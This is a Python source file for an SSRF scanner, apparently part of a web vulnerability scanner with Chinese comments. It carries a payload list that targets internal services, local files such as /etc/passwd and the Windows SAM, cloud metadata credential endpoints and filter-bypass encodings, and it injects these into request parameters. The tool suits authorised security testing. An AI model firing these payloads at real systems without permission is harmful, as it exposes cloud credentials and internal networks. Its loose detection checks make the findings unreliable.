"""WVS v17.0 - SSRF 扫描器

服务器端请求伪造检测
"""
import asyncio
import re
import time
import uuid
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, urljoin
from dataclasses import dataclass
from enum import Enum

try:
    import aiohttp
except ImportError:
    aiohttp = None


class SSRFType(Enum):
    BASIC = "basic"           # 基础 SSRF
    BLIND = "blind"           # 盲 SSRF
    FILE_READ = "file_read"   # 文件读取
    INTERNAL = "internal"     # 内网访问
    CLOUD_META = "cloud_meta" # 云元数据


@dataclass
class SSRFResult:
    vulnerable: bool
    ssrf_type: SSRFType
    parameter: str
    payload: str
    target_accessed: str
    evidence: str
    confidence: float


# SSRF Payload 库
SSRF_PAYLOADS = {
    "internal": [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:9200",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    ],
    "file": [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///var/log/apache2/access.log",
        "file://localhost/etc/passwd",
        "file:///c:/windows/win.ini",
        "file:///c:/windows/system32/config/sam",
    ],
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/metadata/v1/maintenance",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
    "bypass": [
        "http://127.1",
        "http://127.000.000.001",
        "http://2130706433",  # 127.0.0.1 的十进制
        "http://0x7f000001",  # 十六进制
        "http://0177.0.0.1",  # 八进制
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
    ],
    "dns_oob": [
        "http://{unique_id}.ssrf.test.com",
        "http://{unique_id}.burpcollaborator.net",
        "http://{unique_id}.interact.sh",
    ],
}

# 检测特征
EVIDENCE_PATTERNS = {
    "unix_passwd": [
        r"root:[x*]:0:0:",
        r"daemon:[x*]:1:1:",
        r"/bin/(ba)?sh",
    ],
    "cloud_aws": [
        r"ami-id",
        r"ami-launch-index",
        r"ami-manifest-path",
        r"hostname",
        r"instance-id",
        r"instance-type",
        r"local-ipv4",
        r"local-hostname",
        r"public-ipv4",
        r"public-hostname",
        r"reservation-id",
        r"security-groups",
        r"iam/security-credentials",
    ],
    "cloud_gcp": [
        r"project-id",
        r"numeric-project-id",
        r"instance/hostname",
        r"instance/id",
        r"instance/zone",
        r"instance/machine-type",
    ],
    "cloud_azure": [
        r"location",
        r"name",
        r"resourceGroupName",
        r"subscriptionId",
        r"vmId",
        r"vmSize",
    ],
    "internal_port": [
        r"SSH-\d+\.\d+",
        r"MySQL server",
        r"Welcome to the MariaDB",
        r"Redis",
        r" Elasticsearch",
        r"Apache Tomcat",
        r"Jetty",
    ],
}


class SSRFScannerV17:
    """SSRF 扫描器 v17.0"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.oob_server = self.config.get("oob_server", "burpcollaborator.net")
        self.verify_internal = self.config.get("verify_internal", True)
        self.verify_file = self.config.get("verify_file", True)
        self.verify_cloud = self.config.get("verify_cloud", True)
    
    async def scan(
        self,
        url: str,
        method: str = "GET",
        params: Dict[str, str] = None,
        data: Dict[str, str] = None,
        headers: Dict[str, str] = None,
        cookies: Dict[str, str] = None
    ) -> List[SSRFResult]:
        """扫描 SSRF"""
        results = []
        
        params = params or {}
        data = data or {}
        all_params = {**params, **data}
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            for param, value in all_params.items():
                # 测试文件读取
                if self.verify_file:
                    file_result = await self._test_file(
                        session, url, method, param, params, data, headers, cookies
                    )
                    if file_result:
                        results.append(file_result)
                
                # 测试云元数据
                if self.verify_cloud:
                    cloud_result = await self._test_cloud_metadata(
                        session, url, method, param, params, data, headers, cookies
                    )
                    if cloud_result:
                        results.append(cloud_result)
                
                # 测试内网访问
                if self.verify_internal:
                    internal_result = await self._test_internal(
                        session, url, method, param, params, data, headers, cookies
                    )
                    if internal_result:
                        results.append(internal_result)
                
                # 测试绕过
                bypass_result = await self._test_bypass(
                    session, url, method, param, params, data, headers, cookies
                )
                if bypass_result:
                    results.append(bypass_result)
        
        return results
    
    async def _test_file(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[SSRFResult]:
        """测试文件读取"""
        
        for payload in SSRF_PAYLOADS["file"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                for pattern in EVIDENCE_PATTERNS["unix_passwd"]:
                    if re.search(pattern, response_text):
                        return SSRFResult(
                            vulnerable=True,
                            ssrf_type=SSRFType.FILE_READ,
                            parameter=param,
                            payload=payload,
                            target_accessed=payload,
                            evidence=f"发现 /etc/passwd 特征: {pattern}",
                            confidence=0.95
                        )
            except:
                pass
        
        return None
    
    async def _test_cloud_metadata(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[SSRFResult]:
        """测试云元数据访问"""
        
        # AWS
        for payload in SSRF_PAYLOADS["cloud_metadata"][:4]:  # AWS payloads
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                for pattern in EVIDENCE_PATTERNS["cloud_aws"]:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return SSRFResult(
                            vulnerable=True,
                            ssrf_type=SSRFType.CLOUD_META,
                            parameter=param,
                            payload=payload,
                            target_accessed=payload,
                            evidence=f"发现 AWS 元数据: {pattern}",
                            confidence=0.95
                        )
            except:
                pass
        
        # GCP
        for payload in SSRF_PAYLOADS["cloud_metadata"][4:6]:  # GCP payloads
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies,
                    extra_headers={"Metadata-Flavor": "Google"}
                )
                
                for pattern in EVIDENCE_PATTERNS["cloud_gcp"]:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return SSRFResult(
                            vulnerable=True,
                            ssrf_type=SSRFType.CLOUD_META,
                            parameter=param,
                            payload=payload,
                            target_accessed=payload,
                            evidence=f"发现 GCP 元数据: {pattern}",
                            confidence=0.95
                        )
            except:
                pass
        
        return None
    
    async def _test_internal(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[SSRFResult]:
        """测试内网访问"""
        
        for payload in SSRF_PAYLOADS["internal"]:
            try:
                start = time.time()
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                elapsed = time.time() - start
                
                # 检测常见服务响应
                for pattern in EVIDENCE_PATTERNS["internal_port"]:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return SSRFResult(
                            vulnerable=True,
                            ssrf_type=SSRFType.INTERNAL,
                            parameter=param,
                            payload=payload,
                            target_accessed=payload,
                            evidence=f"发现内网服务: {pattern}",
                            confidence=0.9
                        )
                
                # 响应时间分析
                if elapsed < 1 and len(response_text) > 100:
                    # 快速响应且有内容，可能存在
                    return SSRFResult(
                        vulnerable=True,
                        ssrf_type=SSRFType.INTERNAL,
                        parameter=param,
                        payload=payload,
                        target_accessed=payload,
                        evidence=f"内网地址响应正常 (耗时 {elapsed:.2f}s)",
                        confidence=0.7
                    )
            
            except asyncio.TimeoutError:
                # 超时可能意味着端口关闭，但也可能存在 SSRF
                pass
            except:
                pass
        
        return None
    
    async def _test_bypass(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[SSRFResult]:
        """测试绕过技术"""
        
        for payload_template in SSRF_PAYLOADS["bypass"]:
            # 替换为实际测试目标
            test_payload = payload_template
            
            try:
                response_text = await self._send_request(
                    session, url, method, param, test_payload, params, data, headers, cookies
                )
                
                # 检测是否成功访问
                if any(marker in response_text.lower() for marker in ["html", "body", "title"]):
                    return SSRFResult(
                        vulnerable=True,
                        ssrf_type=SSRFType.BASIC,
                        parameter=param,
                        payload=test_payload,
                        target_accessed=test_payload,
                        evidence=f"绕过黑名单成功: {test_payload}",
                        confidence=0.8
                    )
            except:
                pass
        
        return None
    
    async def _send_request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        payload: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict,
        extra_headers: Dict = None
    ) -> str:
        """发送请求"""
        
        test_params = params.copy()
        test_data = data.copy()
        test_headers = {**(headers or {}), **(extra_headers or {})}
        
        if param in test_params:
            test_params[param] = payload
        elif param in test_data:
            test_data[param] = payload
        
        if method.upper() == "GET":
            async with session.get(
                url, 
                params=test_params, 
                headers=test_headers, 
                cookies=cookies
            ) as resp:
                return await resp.text()
        else:
            async with session.request(
                method,
                url,
                params=test_params,
                data=test_data,
                headers=test_headers,
                cookies=cookies
            ) as resp:
                return await resp.text()
    
    def generate_report(self, results: List[SSRFResult]) -> Dict:
        """生成报告"""
        severity_map = {
            SSRFType.FILE_READ: "Critical",
            SSRFType.CLOUD_META: "Critical",
            SSRFType.INTERNAL: "High",
            SSRFType.BASIC: "High",
            SSRFType.BLIND: "Medium",
        }
        
        return {
            "vulnerabilities": [
                {
                    "type": "Server-Side Request Forgery (SSRF)",
                    "parameter": r.parameter,
                    "payload": r.payload,
                    "ssrf_type": r.ssrf_type.value,
                    "target_accessed": r.target_accessed,
                    "confidence": r.confidence,
                    "evidence": r.evidence,
                    "severity": severity_map.get(r.ssrf_type, "Medium")
                }
                for r in results
            ],
            "summary": {
                "total": len(results),
                "critical": sum(1 for r in results if r.ssrf_type in [SSRFType.FILE_READ, SSRFType.CLOUD_META]),
                "high": sum(1 for r in results if r.ssrf_type in [SSRFType.INTERNAL, SSRFType.BASIC]),
                "medium": sum(1 for r in results if r.ssrf_type == SSRFType.BLIND),
            }
        }
